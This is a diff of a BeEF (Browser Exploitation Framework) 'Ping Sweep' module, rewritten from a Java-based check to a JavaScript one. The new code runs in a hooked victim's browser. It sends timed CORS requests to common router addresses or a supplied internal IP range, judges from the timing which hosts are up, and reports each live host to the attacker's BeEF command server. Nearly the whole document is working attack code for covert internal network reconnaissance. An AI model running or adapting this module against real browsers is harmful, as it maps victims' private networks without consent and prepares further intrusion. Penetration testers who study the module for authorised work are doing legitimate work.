@@ -1,68 +1,107 @@
 //
-// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
+// Copyright (c) 2006-2016 Wade Alcorn - wade@bindshell.net
 // Browser Exploitation Framework (BeEF) - http://beefproject.com
 // See the file 'doc/COPYING' for copying permission
 //
 
-
 beef.execute(function() {
 
-    var ips = new Array();
-    var ipRange = "<%= @ipRange %>";
-    var timeout = "<%= @timeout %>";
-    var delay = parseInt(timeout) + parseInt("<%= @delay %>");
-    var verbose=false; /* enable for debug */
+  var ips = new Array();
+  var rhosts = "<%= @rhosts %>";
+  var threads = parseInt("<%= @threads %>", 10) || 3;
+  var timeout = 1000;
 
-    // ipRange will be in the form of 192.168.0.1-192.168.0.254: the fourth octet will be iterated.
-    // Note: if ipRange is just an IP address like 192.168.0.1, the ips array will contain only one element: ipBounds[0]
-    // (only C class IPs are supported atm). Same code as internal_network_fingerprinting module
-    var ipBounds = ipRange.split('-');
-    var ipToTest;
-    if(ipBounds.length>1) {
-	    var lowerBound = parseInt(ipBounds[0].split('.')[3]);
-        var upperBound = parseInt(ipBounds[1].split('.')[3]);
-	
-        for(i=lowerBound;i<=upperBound;i++){
-        	ipToTest = ipBounds[0].split('.')[0]+"."+ipBounds[0].split('.')[1]+"."+ipBounds[0].split('.')[2]+"."+i
-           	ips.push(ipToTest);
-        }
-    } else {
-	    ipToTest = ipBounds[0]
-	    ips.push(ipToTest);
+  if(!beef.browser.hasCors()) {
+    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=Browser does not support CORS', beef.are.status_error());
+    return;
+  }
+
+  // set target IP addresses
+  if (rhosts == 'common') {
+    // use default IPs
+    ips = [
+      '192.168.0.1',
+      '192.168.0.100',
+      '192.168.0.254',
+      '192.168.1.1',
+      '192.168.1.100',
+      '192.168.1.254',
+      '10.0.0.1',
+      '10.1.1.1',
+      '192.168.2.1',
+      '192.168.2.254',
+      '192.168.100.1',
+      '192.168.100.254',
+      '192.168.123.1',
+      '192.168.123.254',
+      '192.168.10.1',
+      '192.168.10.254'
+    ];
+  } else {
+    // set target IP range
+    var range = rhosts.match('^([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\-([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))$');
+    if (range == null || range[1] == null) {
+      beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=malformed IP range supplied", beef.are.status_error());
+      return;
+    }
+    ipBounds   = rhosts.split('-');
+    lowerBound = ipBounds[0].split('.')[3];
+    upperBound = ipBounds[1].split('.')[3];
+    for (var i = lowerBound; i <= upperBound; i++){
+      ipToTest = ipBounds[0].split('.')[0]+"."+ipBounds[0].split('.')[1]+"."+ipBounds[0].split('.')[2]+"."+i;
+      ips.push(ipToTest);
+    }
+  }
+
+  WorkerQueue = function(frequency) {
+
+    var stack = [];
+    var timer = null;
+    var frequency = frequency;
+    var start_scan = (new Date).getTime();
+
+    this.process = function() {
+      var item = stack.shift();
+      eval(item);
+      if (stack.length === 0) {
+        clearInterval(timer);
+        timer = null;
+        var interval = (new Date).getTime() - start_scan;
+        beef.debug("[Ping Sweep] Worker queue is complete ["+interval+" ms]");
+        return;
+      }
     }
 
-    if(ips.length==1) verbose=true;
-
-    
-    function do_scan(host, timeout) {
-	    var status=false;
-	    var ping="";
-
-	    try {
-		    status = java.net.InetAddress.getByName(host).isReachable(timeout);
-	    } catch(e) { /*handle exception...? */ }
-
-	    if (status) {
-		    ping = host + " is alive!";
-	    } else if(verbose) {
-			    ping = host + " is not alive";
-		}
-	    return ping;
+    this.queue = function(item) {
+      stack.push(item);
+      if (timer === null) timer = setInterval(this.process, frequency);
     }
 
+  }
 
-    // call do_scan for each ip
-    // use of setInterval trick to avoid slow script warnings
-    var i=0;
-    if(ips.length>1) {
-	    var int_id = setInterval( function() { 
-		var host = do_scan(ips[i++],timeout);
-		if(host!="") beef.net.send('<%= @command_url %>', <%= @command_id %>, 'host='+host);
-		if(i==ips.length) { clearInterval(int_id); beef.net.send('<%= @command_url %>', <%= @command_id %>, 'host=Ping sweep finished'); }
-    	}, delay);
-    } else {
-    	var host = do_scan(ips[i],timeout);
-	    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'host='+host);
+  // create workers
+  var workers = new Array();
+  for (w=0; w < threads; w++) workers.push(new WorkerQueue(timeout));
+
+  beef.debug("[Ping Sweep] Starting scan ("+(ips.length)+" URLs / "+threads+" workers)");
+  for (var i=0; i < ips.length; i++) {
+    var worker = workers[i % threads];
+    var ip = ips[i];
+    // use a high port likely to be closed/filtered (60000 - 65000)
+    var port = Math.floor(Math.random() * 5000) + 60000;
+    worker.queue('var start_time = new Date().getTime();' +
+      'beef.net.cors.request(' +
+        '"GET", "http://'+ip+':'+port+'/", "", '+timeout+', function(response) {' +
+          'var current_time = new Date().getTime();' +
+          'var duration = current_time - start_time;' +
+          'if (duration < '+timeout+') {' +
+            'beef.debug("[Ping Sweep] '+ip+' [" + duration + " ms] -- host is up");' +
+            'beef.net.send("<%= @command_url %>", <%= @command_id %>, "ip='+ip+'&ping="+duration+"ms", beef.are.status_success());' +
+          '} else {' +
+            'beef.debug("[Ping Sweep] '+ip+' [" + duration + " ms] -- timeout");' +
+          '}' +
+      '});'
+    );
     }
 
 });
